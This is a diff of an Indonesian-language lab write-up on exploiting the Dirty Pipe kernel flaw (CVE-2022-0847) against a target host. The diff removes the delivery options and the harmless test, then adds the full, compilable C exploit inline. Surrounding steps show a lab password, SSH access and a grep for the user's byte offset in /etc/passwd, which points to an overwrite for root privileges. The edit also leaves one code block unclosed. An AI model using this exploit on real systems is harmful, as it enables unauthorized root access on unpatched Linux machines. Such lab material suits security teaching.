@@ -163,19 +163,12 @@ Kernel tersebut rentan terhadap **Dirty Pipe**.
 
 ```bash
 cp /etc/passwd ~/passwd.bak
-sha256sum /etc/passwd ~/passwd.bak
 ```
-
-Hash harus sama.
 
 ---
 
 
 # 7. Mendapatkan File `dirtypipe.c`
-
-`dirtypipe.c` **bukan file bawaan target**. Source-nya harus disiapkan oleh penguji.
-
-## Sumber asli
 
 PoC Dirty Pipe dipublikasikan oleh **Max Kellermann** pada halaman resmi:
 
@@ -190,131 +183,182 @@ Exploiting
 → This is my proof-of-concept exploit
 ```
 
-Kode pada **Lampiran A** di write-up ini adalah versi generik yang diadaptasi dari PoC tersebut untuk kebutuhan lab. Versi ini menerima tiga argumen:
-
-```text
-TARGET_FILE OFFSET DATA
-```
-
-Contoh:
-
 ```bash
-./dirtypipe /etc/passwd 2192 0000
-```
-
-## Cara paling mudah menyiapkannya
-
-### Opsi A — Simpan di Kali lalu kirim dengan SCP
-
-Di Kali, buat file:
-
-```bash
-nano dirtypipe.c
-```
-
-Salin kode pada **Lampiran A**, lalu simpan:
-
-```text
-Ctrl+O → Enter → Ctrl+X
-```
-
-Kirim ke target:
-
-```bash
-scp dirtypipe.c editor@192.168.56.121:/home/editor/
-```
-
-Masukkan password:
-
-```text
-password123
-```
-
-Setelah login SSH ke target:
-
-```bash
-cd /home/editor
-ls -l dirtypipe.c
-```
-
-### Opsi B — Buat langsung pada target
-
-Setelah login sebagai `editor`:
-
-```bash
-cd /home/editor
-nano dirtypipe.c
-```
-
-Tempel kode pada **Lampiran A**, kemudian simpan:
-
-```text
-Ctrl+O → Enter → Ctrl+X
-```
-
-### Opsi C — Exploit-DB/SearchSploit sebagai referensi alternatif
-
-Kali biasanya mempunyai salinan lokal Exploit-DB:
-
-```bash
-searchsploit 50808
-searchsploit -m 50808
-```
-
-Perintah tersebut menyalin exploit Dirty Pipe dari **EDB-ID 50808**. Namun, exploit itu merupakan varian lain dan cara menjalankannya dapat berbeda. Untuk mengikuti command pada write-up ini secara persis, gunakan `dirtypipe.c` pada **Lampiran A**.
-
-## Verifikasi file
-
-```bash
-head -n 5 /home/editor/dirtypipe.c
-```
-
-Bagian awal seharusnya memuat:
-
-```c
+cat > /home/editor/dirtypipe.c <<'EOF'
 /* SPDX-License-Identifier: GPL-2.0 */
+/*
+ * Adapted from the Dirty Pipe CVE-2022-0847 proof of concept.
+ * Original author: Max Kellermann <max.kellermann@ionos.com>
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * Modified for an authorized security lab.
+ */
+
 #define _GNU_SOURCE
-```
 
----
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <unistd.h>
 
-# 8. Kompilasi PoC Dirty Pipe
+static void die(const char *message)
+{
+    perror(message);
+    exit(EXIT_FAILURE);
+}
 
-Pastikan berada di direktori tempat source disimpan:
+static void prepare_pipe(int pipe_fd[2])
+{
+    if (pipe(pipe_fd) != 0) {
+        die("pipe");
+    }
 
-```bash
-cd /home/editor
-ls -l dirtypipe.c
+    const unsigned int pipe_size =
+        (unsigned int)fcntl(pipe_fd[1], F_GETPIPE_SZ);
+
+    static char buffer[4096];
+
+    for (unsigned int remaining = pipe_size; remaining > 0;) {
+        unsigned int size =
+            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;
+
+        if (write(pipe_fd[1], buffer, size) != (ssize_t)size) {
+            die("write pipe");
+        }
+
+        remaining -= size;
+    }
+
+    for (unsigned int remaining = pipe_size; remaining > 0;) {
+        unsigned int size =
+            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;
+
+        if (read(pipe_fd[0], buffer, size) != (ssize_t)size) {
+            die("read pipe");
+        }
+
+        remaining -= size;
+    }
+}
+
+int main(int argc, char **argv)
+{
+    if (argc != 4) {
+        fprintf(
+            stderr,
+            "Usage: %s TARGET_FILE OFFSET DATA\n",
+            argv[0]
+        );
+        return EXIT_FAILURE;
+    }
+
+    const char *target_path = argv[1];
+    loff_t offset = strtoll(argv[2], NULL, 0);
+    const char *data = argv[3];
+    size_t data_size = strlen(data);
+
+    if (offset <= 0) {
+        fprintf(stderr, "Offset harus lebih besar dari 0\n");
+        return EXIT_FAILURE;
+    }
+
+    if ((offset % 4096) == 0) {
+        fprintf(
+            stderr,
+            "Offset tidak boleh tepat di batas halaman\n"
+        );
+        return EXIT_FAILURE;
+    }
+
+    loff_t next_page = (offset | 4095) + 1;
+
+    if (offset + (loff_t)data_size > next_page) {
+        fprintf(
+            stderr,
+            "Data melewati batas halaman 4096 byte\n"
+        );
+        return EXIT_FAILURE;
+    }
+
+    int target_fd = open(target_path, O_RDONLY);
+
+    if (target_fd < 0) {
+        die("open");
+    }
+
+    struct stat target_stat;
+
+    if (fstat(target_fd, &target_stat) != 0) {
+        die("fstat");
+    }
+
+    if (offset + (loff_t)data_size > target_stat.st_size) {
+        fprintf(stderr, "Data melewati ukuran file\n");
+        return EXIT_FAILURE;
+    }
+
+    int pipe_fd[2];
+    prepare_pipe(pipe_fd);
+
+    loff_t splice_offset = offset - 1;
+
+    if (
+        splice(
+            target_fd,
+            &splice_offset,
+            pipe_fd[1],
+            NULL,
+            1,
+            0
+        ) != 1
+    ) {
+        die("splice");
+    }
+
+    ssize_t written = write(pipe_fd[1], data, data_size);
+
+    if (written < 0) {
+        die("write");
+    }
+
+    if ((size_t)written != data_size) {
+        fprintf(
+            stderr,
+            "Short write: %zd dari %zu byte\n",
+            written,
+            data_size
+        );
+        return EXIT_FAILURE;
+    }
+
+    printf(
+        "Berhasil menulis %zu byte pada offset %lld\n",
+        data_size,
+        (long long)offset
+    );
+
+    close(target_fd);
+    close(pipe_fd[0]);
+    close(pipe_fd[1]);
+
+    return EXIT_SUCCESS;
+}
+EOF
 ```
 
 Kompilasi:
 
 ```bash
-gcc -O2 dirtypipe.c -o dirtypipe
-```
+cd /home/editor
+gcc -O2 -Wall dirtypipe.c -o dirtypipe
 
 Verifikasi:
 
 ```bash
 ls -l dirtypipe
 ```
-
-Uji pada file biasa:
-
-```bash
-printf 'ABCDEFGH\n' > dp-test
-chmod 444 dp-test
-./dirtypipe dp-test 1 Z
-cat dp-test
-```
-
-Hasil:
-
-```text
-AZCDEFGH
-```
-
-Artinya Dirty Pipe bekerja.
 
 ---
 
@@ -430,7 +474,7 @@ ssh editor@192.168.56.121
 
 cat /proc/version
 cp /etc/passwd ~/passwd.bak
-# dirtypipe.c dibuat dari Lampiran A atau dikirim dengan SCP
+# dirtypipe.c dibuat dari source dibawah
 cd /home/editor
 gcc -O2 dirtypipe.c -o dirtypipe
 grep -bo 'editor:x:1001:1001' /etc/passwd
@@ -447,7 +491,7 @@ Kerentanan SQL Injection memungkinkan pengambilan kredensial akun `editor`. Pass
 
 ---
 
-# Lampiran A — Source `dirtypipe.c`
+# Source `dirtypipe.c`
 
 > Sumber dasar: PoC resmi CVE-2022-0847 oleh Max Kellermann, CM4all GmbH/IONOS SE.  
 > Versi berikut disederhanakan untuk validasi file read-only pada lab terotorisasi.
